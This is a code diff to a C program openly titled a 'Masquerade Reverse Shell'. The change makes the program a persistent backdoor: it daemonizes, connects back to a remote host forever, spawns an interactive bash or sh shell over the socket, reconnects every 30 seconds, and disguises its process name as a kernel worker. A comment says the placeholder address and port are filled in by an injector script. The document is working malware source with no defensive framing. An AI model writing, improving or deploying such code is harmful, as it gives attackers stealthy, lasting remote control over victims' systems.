@@ -1,10 +1,12 @@
 /*
- * Masquerade Reverse Shell (Robust Version)
+ * Masquerade Reverse Shell (Robust Persistence Version)
  * 
- * Improvements:
- * - Retry logic for connection (5 tries).
- * - Fallback to /bin/sh if /bin/bash fails.
- * - Proper process naming to avoid suspicious "[kworker...]" in some views if execve fails.
+ * Logic:
+ * - Infinite Loop: Tries to connect forever.
+ * - Fork: When connected, forks a child to handle the shell.
+ * - Wait: Parent waits for child (shell) to exit.
+ * - Reconnect: If connection lost (child exits), parent sleeps 30s and retries.
+ * - Masquerading: Changes process name to [kworker/u4:0].
  */
 
 #include <stdio.h>
@@ -13,24 +15,24 @@
 #include <arpa/inet.h>
 #include <sys/types.h>
 #include <sys/socket.h>
+#include <sys/wait.h> // Added for wait()
 #include <string.h>
 #include <stdlib.h>
 #include <errno.h>
 
-// Placeholders
+// Placeholders (Will be replaced by injector.sh using sed)
 #define REMOTE_ADDR "127.0.0.1"
 #define REMOTE_PORT 4444
 #define FAKE_NAME "[kworker/u4:0]"
 
-void try_connect() {
+void persistence_loop() {
     struct sockaddr_in sa;
     int s;
-    int retries = 0;
 
     while (1) {
         s = socket(AF_INET, SOCK_STREAM, 0);
         if (s < 0) {
-            sleep(5);
+            sleep(30);
             continue;
         }
 
@@ -39,37 +41,50 @@ void try_connect() {
         sa.sin_port = htons(REMOTE_PORT);
 
         if (connect(s, (struct sockaddr *)&sa, sizeof(sa)) == 0) {
-            // Connected!
-            break;
+            // Connected! Fork a child for the shell
+            pid_t pid = fork();
+            
+            if (pid == 0) {
+                // Child Process: The Shell
+                dup2(s, 0);
+                dup2(s, 1);
+                dup2(s, 2);
+
+                // Try Bash first
+                char *args[] = {FAKE_NAME, "-p", "-i", NULL};
+                execve("/bin/bash", args, NULL);
+                
+                // Fallback to Sh if Bash fails
+                execve("/bin/sh", args, NULL);
+                
+                // If exec fails, exit child
+                exit(0);
+            } else if (pid > 0) {
+                // Parent Process: The Watchdog
+                // Wait for the shell to finish (connection closed/died)
+                wait(NULL);
+                close(s);
+            } else {
+                // Fork failed
+                close(s);
+            }
+        } else {
+            // Connect failed
+            close(s);
         }
-        
-        close(s);
-        sleep(5); // Wait 5s before retry
-        // In persistence mode, we might want to loop forever or exit to let systemd restart us.
-        // For simple C binary, let's retry a few times then exit (so init system restarts us properly)
-        retries++;
-        if (retries > 10) exit(1); 
+
+        // Wait before reconnecting
+        sleep(30);
     }
-
-    dup2(s, 0);
-    dup2(s, 1);
-    dup2(s, 2);
-
-    // Try Bash first
-    char *args[] = {FAKE_NAME, "-p", "-i", NULL};
-    execve("/bin/bash", args, NULL);
-    
-    // Fallback to Sh if Bash fails
-    execve("/bin/sh", args, NULL);
 }
 
 int main(int argc, char *argv[]) {
-    // Daemonize essentially
+    // Daemonize: Detach from terminal
     pid_t pid = fork();
-    if (pid > 0) return 0;
+    if (pid > 0) return 0; // Parent exits
     if (pid < 0) return 1;
-    setsid();
+    setsid(); // Create new session
 
-    try_connect();
+    persistence_loop();
     return 0;
 }
